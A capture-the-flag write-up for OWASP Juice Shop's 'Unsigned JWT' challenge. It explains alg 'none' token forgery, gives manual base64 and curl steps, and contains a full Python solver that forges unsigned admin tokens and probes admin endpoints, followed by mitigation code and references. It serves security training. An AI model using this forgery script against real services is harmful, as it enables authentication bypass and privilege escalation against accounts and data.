# Unsigned JWT Challenge - OWASP Juice Shop

## Complete Security Analysis and Exploitation Guide

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Vulnerability Introduction](#vulnerability-introduction)
3. [CVSS Analysis](#cvss-analysis)
4. [Manual Exploitation](#manual-exploitation)
5. [Automated Python Script](#automated-python-script)
6. [Mitigation Strategies](#mitigation-strategies)
7. [References](#references)

---

## Challenge Overview

**Challenge Name**: Unsigned JWT
**Difficulty**: ⭐⭐⭐⭐⭐ (5/6)
**Category**: Vulnerable Components
**Target Instance**: https://juice5.wonkatech.org/#/ *(Change to your instance)*

**Objective**: Forge an essentially unsigned JSON Web Token that impersonates the (non-existing) user jwtn3d@juice-sh.op.

---

## Vulnerability Introduction

### What is an Unsigned JWT Vulnerability?

**JWT (JSON Web Token)** is a standard for securely transmitting information between parties as a JSON object. A properly implemented JWT consists of three parts:

```
Header.Payload.Signature
```

**Unsigned JWT Vulnerability** occurs when:
1. **Algorithm confusion** - Server accepts `"alg": "none"` tokens
2. **Missing signature verification** - Server doesn't validate signatures
3. **Weak secret keys** - Signatures can be cracked or guessed
4. **Algorithm manipulation** - Changing from symmetric to asymmetric algorithms

### How JWTs Should Work

**Secure JWT Flow**:
```
1. User logs in with credentials
2. Server validates credentials
3. Server creates JWT with SECURE signature:
   {
     "alg": "HS256",  // Strong algorithm
     "typ": "JWT"
   }.{
     "userId": 123,
     "role": "user",
     "iat": 1640000000,
     "exp": 1640086400
   }.SECURE_SIGNATURE_HERE

4. Client stores JWT
5. Client sends JWT with requests
6. Server VALIDATES signature before trusting claims
```

**Vulnerable JWT Flow**:
```
1. Attacker gets any valid JWT
2. Attacker modifies algorithm to "none":
   {
     "alg": "none",   // No signature required!
     "typ": "JWT"
   }.{
     "userId": 0,     // Admin user ID
     "role": "admin", // Escalated privilege
     "email": "jwtn3d@juice-sh.op"  // Target email
   }.   // No signature needed!

3. Server accepts unsigned token
4. Attacker gains unauthorized access
```

### Real-World Examples

**CVE-2015-9235**: Firebase JWT library accepted unsigned tokens
**CVE-2016-5431**: Drupal JWT module algorithm confusion
**CVE-2018-0114**: Multiple Node.js JWT libraries vulnerable to algorithm switching

---

## CVSS Analysis

### CVSS v3.1 Score: 9.1 (Critical)

**Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Breakdown**:
- **Attack Vector (AV): Network (N)** - Exploitable over the network
- **Attack Complexity (AC): Low (L)** - Simple to exploit with basic tools
- **Privileges Required (PR): None (N)** - No authentication needed initially
- **User Interaction (UI): None (N)** - No user interaction required
- **Scope (S): Unchanged (U)** - Impact within vulnerable component
- **Confidentiality (C): High (H)** - Can access sensitive user data
- **Integrity (I): High (H)** - Can modify application data and user accounts
- **Availability (A): None (N)** - No direct impact on system availability

**Simple Explanation**:
This is a **Critical severity** vulnerability because:
- 🔥 **Complete authentication bypass** - Access any user account
- 🔥 **Privilege escalation** - Become admin without credentials
- 🔥 **Data access** - Read sensitive information
- 🔥 **Data modification** - Change user profiles, orders, etc.
- ✅ **Easy to exploit** - Basic JWT manipulation tools

---

## Manual Exploitation

### Step 1: Understanding JWT Structure

**JWT Anatomy**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSIsInJvbGUiOiJ1c2VyIn0.signature
│─────────── Header ───────────│──────────── Payload ───────────│─ Signature ─│
```

**Decoded Header** (Base64):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Decoded Payload** (Base64):
```json
{
  "userId": 1,
  "email": "test@test.com",
  "role": "user",
  "iat": 1640000000,
  "exp": 1640086400
}
```

### Step 2: Obtaining a Valid JWT

**Method 1: Register and Login**

1. **Navigate to Juice Shop**: https://juice5.wonkatech.org/#/
2. **Register an account**:
   - Click "Account" → "Login"
   - Click "Not yet a customer?"
   - Fill out registration form
3. **Login** with your credentials
4. **Extract JWT token**:
   - Open DevTools (F12)
   - Go to Application tab
   - Check Local Storage
   - Copy the `token` value

**Method 2: Intercept Login Request**

1. **Open DevTools** → **Network** tab
2. **Clear network log**
3. **Filter by XHR**
4. **Login** to your account
5. **Find the login request**:
   ```
   POST /rest/user/login
   ```
6. **Check Response**:
   ```json
   {
     "authentication": {
       "token": "eyJhbGci...",
       "umail": "user@test.com"
     }
   }
   ```

### Step 3: Decoding the JWT

**Using jwt.io**:

1. **Go to** [jwt.io](https://jwt.io/)
2. **Paste your token** in the "Encoded" section
3. **Observe the decoded header and payload**

**Using Command Line**:
```bash
# Extract header (first part before first dot)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d

# Extract payload (second part between dots)
echo "eyJ1c2VySWQiOjEsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSJ9" | base64 -d
```

### Step 4: Forging the Unsigned JWT

**Goal**: Create a JWT for user `jwtn3d@juice-sh.op` with no signature.

**Step 4a: Modify Header**
```json
{
  "alg": "none",  // Changed from "HS256" to "none"
  "typ": "JWT"
}
```

**Step 4b: Modify Payload**
```json
{
  "userId": 0,  // Or try different IDs
  "email": "jwtn3d@juice-sh.op",  // Target email
  "role": "admin",  // Escalate privileges
  "iat": 1640000000,
  "exp": 9999999999  // Far future expiration
}
```

**Step 4c: Create Unsigned Token**

**Manual Process**:
1. **Encode Header**:
   ```bash
   echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0
   # Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
   ```

2. **Encode Payload**:
   ```bash
   echo -n '{"userId":0,"email":"jwtn3d@juice-sh.op","role":"admin","iat":1640000000,"exp":9999999999}' | base64 -w 0
   # Output: eyJ1c2VySWQiOjAsImVtYWlsIjoianD0bjNkQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjQwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9
   ```

3. **Combine with empty signature**:
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjAsImVtYWlsIjoianD0bjNkQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjQwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.
   ```

   **Note the trailing dot with no signature!**

### Step 5: Testing the Forged Token

**Method 1: Browser DevTools**

1. **Open DevTools** → **Application** tab
2. **Find Local Storage** → your domain
3. **Edit the `token` value**:
   - Delete old token
   - Paste new unsigned token
4. **Refresh the page**
5. **Check if you're logged in as jwtn3d@juice-sh.op**

**Method 2: Using curl**

```bash
# Test API endpoint with forged token
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjAsImVtYWlsIjoianD0bjNkQGp1aWNlLXNoLm9wIiwicm9sZSI6ImFkbWluIn0." \
     https://juice5.wonkatech.org/rest/user/whoami
```

### Step 6: Validation

**Success Indicators**:
- API returns user info for `jwtn3d@juice-sh.op`
- You can access admin functionalities
- Challenge completion notification appears
- Score board shows "Unsigned JWT" challenge as solved

---

## Automated Python Script

```python
#!/usr/bin/env python3
"""
Unsigned JWT Challenge Solver
=============================
Automated exploitation of JWT algorithm confusion vulnerabilities in Juice Shop.

Target: Juice Shop instance
Challenge: Forge unsigned JWT for jwtn3d@juice-sh.op

Usage:
    python3 unsigned_jwt_solver.py
"""

import requests
import json
import base64
import time
import sys
from urllib.parse import urljoin

# ============================================================================
# CONFIGURATION - Change these values for your Juice Shop instance
# ============================================================================

# Change this URL to your Juice Shop instance
JUICE_SHOP_URL = "https://juice5.wonkatech.org"  # <-- CHANGE THIS

# Target user to impersonate
TARGET_EMAIL = "jwtn3d@juice-sh.op"

# JWT algorithms to try
ALGORITHMS_TO_TRY = ["none", "None", "NONE", ""]

# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


class UnsignedJWTSolver:
    """Unsigned JWT Challenge solver"""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        self.original_token = None
        self.forged_token = None

    def print_banner(self):
        """Print challenge banner"""
        print(f"\n{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}  UNSIGNED JWT CHALLENGE SOLVER{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}{'='*70}{Colors.ENDC}\n")
        print(f"{Colors.CYAN}Target: {Colors.BOLD}{self.base_url}{Colors.ENDC}")
        print(f"{Colors.CYAN}Objective: Forge unsigned JWT for {TARGET_EMAIL}{Colors.ENDC}\n")

    def get_legitimate_token(self):
        """Get a legitimate JWT token by registering and logging in"""
        print(f"{Colors.CYAN}🔑 Obtaining legitimate JWT token...{Colors.ENDC}")

        # Generate unique credentials
        timestamp = str(int(time.time()))
        email = f"jwttest{timestamp}@test.com"
        password = f"Test123!{timestamp}"

        # Register user
        register_data = {
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
            "securityAnswer": "test"
        }

        try:
            register_url = urljoin(self.base_url, '/api/Users/')
            register_response = self.session.post(register_url, json=register_data)
        except:
            pass  # Registration might fail if user exists

        # Login
        login_data = {"email": email, "password": password}
        login_url = urljoin(self.base_url, '/rest/user/login')

        try:
            login_response = self.session.post(login_url, json=login_data)

            if login_response.status_code == 200:
                result = login_response.json()
                self.original_token = result.get('authentication', {}).get('token')

                if self.original_token:
                    print(f"{Colors.GREEN}✅ Obtained legitimate token{Colors.ENDC}")
                    self.analyze_token_structure(self.original_token)
                    return True

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to obtain token: {e}{Colors.ENDC}")

        return False

    def analyze_token_structure(self, token):
        """Analyze the structure of a legitimate JWT token"""
        print(f"{Colors.CYAN}🔍 Analyzing JWT structure...{Colors.ENDC}")

        try:
            # Split JWT into parts
            parts = token.split('.')
            if len(parts) != 3:
                print(f"{Colors.RED}❌ Invalid JWT format{Colors.ENDC}")
                return

            header_encoded, payload_encoded, signature = parts

            # Decode header
            header_padding = 4 - len(header_encoded) % 4
            if header_padding != 4:
                header_encoded += '=' * header_padding

            header_decoded = base64.b64decode(header_encoded).decode('utf-8')
            header_json = json.loads(header_decoded)

            # Decode payload
            payload_padding = 4 - len(payload_encoded) % 4
            if payload_padding != 4:
                payload_encoded += '=' * payload_padding

            payload_decoded = base64.b64decode(payload_encoded).decode('utf-8')
            payload_json = json.loads(payload_decoded)

            print(f"   {Colors.GREEN}Header:{Colors.ENDC}")
            print(f"   {json.dumps(header_json, indent=6)}")
            print(f"   {Colors.GREEN}Payload:{Colors.ENDC}")
            print(f"   {json.dumps(payload_json, indent=6)}")
            print(f"   {Colors.GREEN}Signature Length:{Colors.ENDC} {len(signature)} characters")

            return header_json, payload_json

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to analyze token: {e}{Colors.ENDC}")
            return None, None

    def create_unsigned_jwt(self, algorithm="none"):
        """Create an unsigned JWT for the target user"""
        print(f"{Colors.CYAN}🔧 Forging unsigned JWT with algorithm: {algorithm}{Colors.ENDC}")

        # Create header with no algorithm
        header = {
            "alg": algorithm,
            "typ": "JWT"
        }

        # Create payload for target user
        current_time = int(time.time())
        payload = {
            "userId": 0,  # Try user ID 0 or other values
            "email": TARGET_EMAIL,
            "role": "admin",  # Try to escalate privileges
            "iat": current_time,
            "exp": current_time + (24 * 60 * 60)  # 24 hours from now
        }

        # Encode parts
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')

        # Create unsigned token (note the trailing dot with no signature)
        unsigned_token = f"{header_encoded}.{payload_encoded}."

        print(f"   {Colors.GREEN}Forged Token:{Colors.ENDC}")
        print(f"   {unsigned_token[:60]}...{unsigned_token[-20:]}")

        return unsigned_token

    def test_forged_token(self, token):
        """Test if the forged JWT token is accepted"""
        print(f"{Colors.CYAN}🧪 Testing forged JWT token...{Colors.ENDC}")

        # Test with whoami endpoint
        whoami_url = urljoin(self.base_url, '/rest/user/whoami')

        try:
            headers = {'Authorization': f'Bearer {token}'}
            response = self.session.get(whoami_url, headers=headers)

            if response.status_code == 200:
                result = response.json()
                user_data = result.get('user', {})

                if user_data.get('email') == TARGET_EMAIL:
                    print(f"{Colors.GREEN}✅ SUCCESS! Forged JWT accepted!{Colors.ENDC}")
                    print(f"   {Colors.GREEN}User ID:{Colors.ENDC} {user_data.get('id')}")
                    print(f"   {Colors.GREEN}Email:{Colors.ENDC} {user_data.get('email')}")
                    print(f"   {Colors.GREEN}Role:{Colors.ENDC} {user_data.get('role', 'N/A')}")
                    return True
                else:
                    print(f"{Colors.YELLOW}⚠️  Token accepted but for different user: {user_data.get('email')}{Colors.ENDC}")
            else:
                print(f"   {Colors.RED}❌ Token rejected (HTTP {response.status_code}){Colors.ENDC}")

        except Exception as e:
            print(f"   {Colors.RED}❌ Test failed: {e}{Colors.ENDC}")

        return False

    def attempt_privilege_escalation(self, token):
        """Attempt to access admin functionality with forged token"""
        print(f"{Colors.CYAN}🔒 Testing admin access with forged token...{Colors.ENDC}")

        # Test admin endpoints
        admin_endpoints = [
            '/rest/admin/application-version',
            '/rest/admin/application-configuration',
            '/api/Users',  # List all users
        ]

        headers = {'Authorization': f'Bearer {token}'}
        admin_access = False

        for endpoint in admin_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.get(url, headers=headers)

                if response.status_code == 200:
                    print(f"   {Colors.GREEN}✅ Admin access granted: {endpoint}{Colors.ENDC}")
                    admin_access = True
                else:
                    print(f"   {Colors.RED}❌ Admin access denied: {endpoint} (HTTP {response.status_code}){Colors.ENDC}")

            except Exception as e:
                print(f"   {Colors.YELLOW}⚠️  Error testing {endpoint}: {e}{Colors.ENDC}")

        return admin_access

    def solve_challenge(self):
        """Main method to solve the unsigned JWT challenge"""
        self.print_banner()

        # Step 1: Get legitimate token for analysis
        if not self.get_legitimate_token():
            print(f"{Colors.RED}❌ Failed to obtain legitimate JWT token{Colors.ENDC}")
            return False

        # Step 2: Try different unsigned JWT variations
        print(f"\n{Colors.CYAN}🔄 Attempting JWT forgery with different algorithms...{Colors.ENDC}")

        for algorithm in ALGORITHMS_TO_TRY:
            print(f"\n{Colors.YELLOW}🔧 Trying algorithm: '{algorithm}'{Colors.ENDC}")

            # Create forged token
            forged_token = self.create_unsigned_jwt(algorithm)

            # Test the forged token
            if self.test_forged_token(forged_token):
                self.forged_token = forged_token

                # Test admin access
                admin_access = self.attempt_privilege_escalation(forged_token)

                print(f"\n{Colors.GREEN}{Colors.BOLD}🎉 UNSIGNED JWT CHALLENGE COMPLETED!{Colors.ENDC}")
                print(f"{Colors.GREEN}Successfully impersonated: {TARGET_EMAIL}{Colors.ENDC}")
                if admin_access:
                    print(f"{Colors.GREEN}Admin privileges obtained!{Colors.ENDC}")

                return True

        print(f"\n{Colors.RED}❌ Challenge not completed automatically{Colors.ENDC}")
        print(f"{Colors.YELLOW}The application might have additional protections{Colors.ENDC}")

        return False

    def create_variations(self):
        """Create multiple JWT variations for testing"""
        print(f"{Colors.CYAN}🎯 Creating JWT variations...{Colors.ENDC}")

        variations = []

        # Different user IDs to try
        user_ids = [0, -1, 999999, None]

        # Different roles to try
        roles = ["admin", "administrator", "root", "superuser", ""]

        for user_id in user_ids:
            for role in roles:
                payload = {
                    "email": TARGET_EMAIL,
                    "role": role,
                    "iat": int(time.time()),
                    "exp": int(time.time()) + (24 * 60 * 60)
                }

                if user_id is not None:
                    payload["userId"] = user_id

                for algorithm in ALGORITHMS_TO_TRY:
                    # Create header
                    header = {"alg": algorithm, "typ": "JWT"}

                    # Encode
                    header_encoded = base64.urlsafe_b64encode(
                        json.dumps(header, separators=(',', ':')).encode()
                    ).decode().rstrip('=')

                    payload_encoded = base64.urlsafe_b64encode(
                        json.dumps(payload, separators=(',', ':')).encode()
                    ).decode().rstrip('=')

                    # Create token
                    token = f"{header_encoded}.{payload_encoded}."
                    variations.append({
                        'token': token,
                        'algorithm': algorithm,
                        'userId': user_id,
                        'role': role
                    })

        print(f"   {Colors.GREEN}Created {len(variations)} JWT variations{Colors.ENDC}")
        return variations

    def test_all_variations(self):
        """Test all JWT variations"""
        print(f"{Colors.CYAN}🧪 Testing all JWT variations...{Colors.ENDC}")

        variations = self.create_variations()
        tested = 0

        for variation in variations:
            tested += 1
            if tested % 10 == 0:
                print(f"   Tested {tested}/{len(variations)} variations...")

            if self.test_forged_token(variation['token']):
                print(f"\n{Colors.GREEN}✅ WORKING VARIATION FOUND!{Colors.ENDC}")
                print(f"   Algorithm: {variation['algorithm']}")
                print(f"   User ID: {variation['userId']}")
                print(f"   Role: {variation['role']}")
                return variation['token']

            time.sleep(0.05)  # Rate limiting

        return None


def main():
    """Main entry point"""
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        # Use default URL - CHANGE THIS FOR YOUR INSTANCE
        base_url = JUICE_SHOP_URL

    print(f"{Colors.YELLOW}🎯 Starting Unsigned JWT Challenge{Colors.ENDC}")
    print(f"{Colors.YELLOW}Target: {base_url}{Colors.ENDC}")

    solver = UnsignedJWTSolver(base_url)
    success = solver.solve_challenge()

    if not success:
        print(f"\n{Colors.CYAN}💡 Manual alternatives:{Colors.ENDC}")
        print(f"1. Use jwt.io to manually create unsigned token")
        print(f"2. Try different user IDs (0, -1, 999)")
        print(f"3. Test various algorithm values ('none', '', null)")
        print(f"4. Check if application validates JWT signatures at all")
        print(f"5. Try algorithm confusion attack (HS256 → RS256)")

        # Show example forged token
        example_header = '{"alg":"none","typ":"JWT"}'
        example_payload = f'{{"email":"{TARGET_EMAIL}","role":"admin","iat":{int(time.time())},"exp":{int(time.time()) + 86400}}}'

        header_b64 = base64.urlsafe_b64encode(example_header.encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(example_payload.encode()).decode().rstrip('=')
        example_token = f"{header_b64}.{payload_b64}."

        print(f"\n{Colors.CYAN}🔧 Example forged token:{Colors.ENDC}")
        print(f"{example_token}")
        print(f"\n{Colors.CYAN}📖 Manual steps:{Colors.ENDC}")
        print(f"1. Copy token above")
        print(f"2. Open browser DevTools → Application → Local Storage")
        print(f"3. Replace 'token' value with forged token")
        print(f"4. Refresh page and check if logged in as {TARGET_EMAIL}")

if __name__ == '__main__':
    main()
```

### Script Usage

```bash
# Install dependencies
pip3 install requests

# Make executable
chmod +x unsigned_jwt_solver.py

# Run against default instance
python3 unsigned_jwt_solver.py

# Run against your instance
python3 unsigned_jwt_solver.py https://your-juice-shop.com

# View detailed output
python3 unsigned_jwt_solver.py | tee jwt_attack_log.txt
```

---

## Mitigation Strategies

### 1. Algorithm Validation

**Strict Algorithm Enforcement**:

```javascript
const jwt = require('jsonwebtoken');

// BAD - Accepts any algorithm
function verifyTokenBad(token) {
    return jwt.verify(token, secret);  // Dangerous!
}

// GOOD - Explicitly specify allowed algorithms
function verifyTokenGood(token, secret) {
    return jwt.verify(token, secret, {
        algorithms: ['HS256']  // Only allow HS256
    });
}

// BETTER - With comprehensive validation
function verifyTokenSecure(token, secret) {
    try {
        const decoded = jwt.verify(token, secret, {
            algorithms: ['HS256'],      // Whitelist algorithms
            issuer: 'juice-shop-app',   // Verify issuer
            audience: 'juice-shop-users', // Verify audience
            maxAge: '1h',               // Token expires in 1 hour
            clockTolerance: 30          // 30 seconds clock skew tolerance
        });

        // Additional validation
        if (!decoded.userId || !decoded.email) {
            throw new Error('Invalid token structure');
        }

        return decoded;
    } catch (error) {
        throw new Error(`JWT validation failed: ${error.message}`);
    }
}
```

### 2. Secure JWT Generation

```javascript
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

// Generate strong secret key
const JWT_SECRET = crypto.randomBytes(64).toString('hex');

// Store in environment variable
process.env.JWT_SECRET = JWT_SECRET;

function generateSecureJWT(user) {
    const payload = {
        userId: user.id,
        email: user.email,
        role: user.role,
        iat: Math.floor(Date.now() / 1000),
        exp: Math.floor(Date.now() / 1000) + (60 * 60), // 1 hour
        iss: 'juice-shop-app',  // Issuer
        aud: 'juice-shop-users' // Audience
    };

    return jwt.sign(payload, process.env.JWT_SECRET, {
        algorithm: 'HS256'
    });
}

function validateJWT(token) {
    if (!token) {
        throw new Error('No token provided');
    }

    try {
        // Remove 'Bearer ' prefix if present
        if (token.startsWith('Bearer ')) {
            token = token.substring(7);
        }

        return jwt.verify(token, process.env.JWT_SECRET, {
            algorithms: ['HS256'],
            issuer: 'juice-shop-app',
            audience: 'juice-shop-users'
        });
    } catch (error) {
        throw new Error(`Invalid token: ${error.message}`);
    }
}
```

### 3. Middleware Implementation

```javascript
// Express middleware for JWT validation
function requireValidJWT(req, res, next) {
    const authHeader = req.headers.authorization;

    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({
            error: 'Access denied. Valid JWT token required.'
        });
    }

    try {
        const token = authHeader.substring(7);
        const decoded = validateJWT(token);

        // Attach user info to request
        req.user = decoded;
        next();
    } catch (error) {
        return res.status(401).json({
            error: 'Invalid or expired token',
            details: error.message
        });
    }
}

// Usage in routes
app.get('/rest/user/whoami', requireValidJWT, (req, res) => {
    res.json({
        user: {
            id: req.user.userId,
            email: req.user.email,
            role: req.user.role
        }
    });
});

app.get('/rest/admin/*', requireValidJWT, requireAdminRole, (req, res) => {
    // Admin-only functionality
});

function requireAdminRole(req, res, next) {
    if (req.user.role !== 'admin') {
        return res.status(403).json({
            error: 'Admin access required'
        });
    }
    next();
}
```

### 4. Token Storage Security

**Secure Storage Options**:

```javascript
// Option 1: HTTP-only cookies (Recommended)
app.post('/login', async (req, res) => {
    const user = await authenticateUser(req.body);
    const token = generateSecureJWT(user);

    // Set secure cookie
    res.cookie('authToken', token, {
        httpOnly: true,      // JavaScript cannot access
        secure: true,        // HTTPS only
        sameSite: 'strict',  // CSRF protection
        maxAge: 3600000      // 1 hour
    });

    res.json({ user: sanitizeUser(user) });
});

// Middleware to extract from cookie
function extractTokenFromCookie(req, res, next) {
    const token = req.cookies.authToken;
    if (token) {
        req.headers.authorization = `Bearer ${token}`;
    }
    next();
}

// Option 2: Short-lived tokens with refresh
app.post('/login', async (req, res) => {
    const user = await authenticateUser(req.body);

    const accessToken = generateSecureJWT(user, '15m');   // 15 minutes
    const refreshToken = crypto.randomBytes(64).toString('hex');

    // Store refresh token in database
    await storeRefreshToken(user.id, refreshToken);

    // Set refresh token as HTTP-only cookie
    res.cookie('refreshToken', refreshToken, {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
    });

    res.json({ accessToken, expiresIn: 900 });  // 15 minutes
});
```

### 5. Additional Security Measures

**JWT Security Headers**:

```javascript
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],
            // Prevent inline scripts that could manipulate JWT
        }
    }
}));

// Custom header to prevent JWT manipulation
app.use((req, res, next) => {
    res.setHeader('X-JWT-Security', 'strict-validation-enabled');
    next();
});
```

**Token Blacklisting**:

```javascript
const blacklistedTokens = new Set();

function blacklistToken(token) {
    blacklistedTokens.add(token);
    // Also store in Redis/database for distributed systems
}

function isTokenBlacklisted(token) {
    return blacklistedTokens.has(token);
}

// Middleware to check blacklist
function checkTokenBlacklist(req, res, next) {
    const token = extractTokenFromRequest(req);

    if (isTokenBlacklisted(token)) {
        return res.status(401).json({
            error: 'Token has been revoked'
        });
    }

    next();
}

// Use in logout to blacklist token
app.post('/logout', requireValidJWT, (req, res) => {
    const token = extractTokenFromRequest(req);
    blacklistToken(token);
    res.json({ message: 'Logged out successfully' });
});
```

---

## References

### NIST Guidelines

**NIST SP 800-63B (Authentication Guidelines)**:
- Section 4.2.2: Token-based authentication requirements
- Section 5.1.1: Cryptographic key management
- Appendix A: Strength of authentication mechanisms

**NIST SP 800-57 (Key Management)**:
- Part 1: Key management best practices
- Part 3: Application-specific key management guidance

**NIST Cybersecurity Framework**:
- **Identify (ID)**: Asset management and risk assessment
- **Protect (PR)**: Access control and data security
- **Detect (DE)**: Continuous monitoring
- **Respond (RS)**: Incident response procedures
- **Recover (RC)**: Recovery and improvements

### OWASP Guidelines

**OWASP Top 10 2021**:
- **A02: Cryptographic Failures** - Weak JWT implementation
- **A07: Identification and Authentication Failures** - JWT vulnerabilities

**OWASP JWT Security Best Practices**:
- Always validate the algorithm in the JWT header
- Use strong, random secrets for HMAC-based algorithms
- Implement proper key management for RSA/ECDSA algorithms
- Never store sensitive data in JWT payload (it's only base64 encoded)
- Implement token expiration and refresh mechanisms

**OWASP ASVS v4.0**:
- **V2.8**: Single Sign-on Security Requirements
- **V3.5**: Token-based Session Management
- **V6.1**: Data Classification and Handling

### Industry Standards

**RFC 7519 (JWT Standard)**:
- Section 6: Unsecured JWTs (algorithm "none")
- Section 7: Security considerations
- Section 8: IANA considerations

**RFC 7515 (JSON Web Signature)**:
- Algorithm specifications and security requirements
- Signature validation procedures

**Common Vulnerabilities and Exposures (CVE)**:
- CVE-2015-9235: Firebase JWT library accepts unsigned tokens
- CVE-2016-5431: Drupal JWT algorithm confusion
- CVE-2018-0114: Node.js JWT libraries vulnerable to key confusion

### Security Resources

**Documentation**:
- [JWT.io](https://jwt.io/) - JWT decoder and encoder
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0 JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [NIST Authentication Guidelines](https://pages.nist.gov/800-63-3/)

**Tools**:
- [JWT_Tool](https://github.com/ticarpi/jwt_tool) - JWT manipulation toolkit
- [Burp Suite JWT Extension](https://github.com/DolphFlynn/jwt-editor) - JWT testing
- [Hashcat](https://hashcat.net/hashcat/) - JWT secret cracking
- [John the Ripper](https://www.openwall.com/john/) - Password/secret cracking

**Training Resources**:
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt) - Comprehensive JWT security course
- [PentesterLab JWT Exercises](https://pentesterlab.com/exercises/jwt) - Hands-on practice
- [HackTricks JWT](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) - Attack techniques

---

**Document Version**: 1.0
**Last Updated**: 2025-10-10
**Author**: Walter Barr
**Challenge Difficulty**: ⭐⭐⭐⭐⭐ (5/6)
**Estimated Time**: 45-90 minutes